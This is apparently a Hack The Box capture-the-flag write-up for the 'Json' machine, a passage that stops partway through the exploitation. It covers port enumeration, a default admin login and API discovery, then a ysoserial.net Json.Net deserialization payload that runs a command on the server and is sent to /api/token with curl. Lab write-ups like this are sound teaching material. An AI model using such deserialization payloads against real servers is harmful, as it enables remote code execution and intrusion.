I"æ<h1 id="medium-json-">[MEDIUM] Json <br /></h1>

<p><img src="/writeups/htb/boxes/images/json_1.png# icon" alt="Json icon" /></p>

<h2 style="font-size: 1.4em">Enumeration</h2>
<h2 style="font-size: 1.2em">NMAP</h2>

<p>We have our nmap scan run the following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-v</span> 10.10.10.158 <span class="nt">-p</span> 1-10000

</code></pre></div></div>

<p>Then here is the result:</p>

<p><img src="/writeups/htb/boxes/images/json_2.png" alt="2" /></p>

<p><img src="/writeups/htb/boxes/images/json_3.png" alt="3" /></p>

<p>Important services:<br />
FTP - port 21
HTTP - port 80
RPC - port 135
Netbios-ssn - port 139
SMB - port 445
HTTP (Winrm service) - port 5985 
<br /></p>

<h2 style="font-size: 1.2em">FTP Anonymous Login</h2>
<p><br /></p>

<p>Checking FTP if we can login as anonymous user:</p>

<p><img src="/writeups/htb/boxes/images/json_4.png" alt="4" /></p>

<p>We can‚Äôt login as anonymous
<br /></p>

<h2 style="font-size: 1.2em">Web Service Enumeration</h2>
<p><br /></p>

<p>Checking the page served at port 80:
<img src="/writeups/htb/boxes/images/json_5.png" alt="5" /></p>

<p><br />
Quick check for ‚Äúadmin‚Äù/‚Äùadmin‚Äù username/password to see if it works.</p>

<p><img src="/writeups/htb/boxes/images/json_6.png" alt="6" />
It worked as it opens up a dashboard. However, upon further inspection of the links on the dashboard, most of it are dead. 
<br /></p>

<p>Checking the page source, we can see there is a javascript file called <code class="highlighter-rouge">app.min.js</code>. Below are also its contents</p>

<p><img src="/writeups/htb/boxes/images/json_7.png# medium" alt="7" /></p>

<p><br /></p>

<p>And here is its content:
<img src="/writeups/htb/boxes/images/json_8.png" alt="8" />
Since it‚Äôs hard to read it this way, we can fix this by feeding it to a javascript code beautifier.
<img src="/writeups/htb/boxes/images/json_9.png" alt="9" /></p>

<p>There are two links we can see:</p>
<ul>
  <li><code class="highlighter-rouge">/api/token</code> at line 15</li>
  <li><code class="highlighter-rouge">/api/Account</code> at line 26</li>
</ul>

<p><br /></p>

<p>The <code class="highlighter-rouge">/api/token</code> accepts <code class="highlighter-rouge">POST</code> requests with data parameters <code class="highlighter-rouge">UserName</code> and <code class="highlighter-rouge">Password</code> while <code class="highlighter-rouge">/api/Account</code> accepts <code class="highlighter-rouge">GET</code> requests whereas it has additional header called <code class="highlighter-rouge">Bearer</code> (decoded bytecode from line 28).</p>

<p><br />
Accessing those links with curl will give these results:</p>
<ul>
  <li>Result at <code class="highlighter-rouge">/api/token</code> curl
<img src="/writeups/htb/boxes/images/json_10.png" alt="10" />
will set a cookie which is a base64 JSON of user info
<img src="/writeups/htb/boxes/images/json_11.png" alt="11" />
    <pre><code class="language-JSON">{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
</code></pre>
    <p><br />
There is nothing really new in there. Even the password hash is also just ‚Äúadmin‚Äù.
<img src="/writeups/htb/boxes/images/json_12.png#" alt="12" />
<br /></p>
  </li>
  <li>Result at <code class="highlighter-rouge">/api/token</code> curl. Since the <code class="highlighter-rouge">Bearer</code> header is for authentication, we just set its value from the value of the cookie given by <code class="highlighter-rouge">/api/token</code>.
<img src="/writeups/htb/boxes/images/json_13.png#" alt="13" /></li>
</ul>

<p><br />
However, the result is also the JSON received earlier but only in decoded base64 form.
<img src="/writeups/htb/boxes/images/json_14.png#" alt="14" /></p>

<h2 style="font-size: 1.4em">Web Service Exploitation. (Deserialization Exploit)</h2>
<p><br />
However, a malformed json being sent to the server either via two of those links will return an error. 
<img src="/writeups/htb/boxes/images/json_15.png#" alt="15" />
It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>.
<br /></p>

<p>Running the .exe file in a windows machine:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\y</span>soserial.net <span class="nt">-f</span> Json.Net <span class="nt">-g</span> ObjectDataProvider <span class="nt">-c</span> <span class="s2">"cmd /c ping 10.10.14.87"</span>

</code></pre></div></div>
<p>It will give this payload:</p>

<pre><code class="language-JSON">{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping 10.10.14.87']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
</code></pre>

<h1 id="targeting--apitoken">Targeting : /api/token</h1>

<p>We setup an icmp sniffer:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -i tun0 icmp
</code></pre></div></div>
<p>and then we attack. If our payload succeeds, our icmp sniffer should be accepting icmp packets.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.158/api/token <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>payload.txt<span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>
<p>However, this attack only made the server return an error and the server did not execute the ping command.</p>

<h1 id="targeting--apiaccount">Targeting : /api/Account</h1>

:ET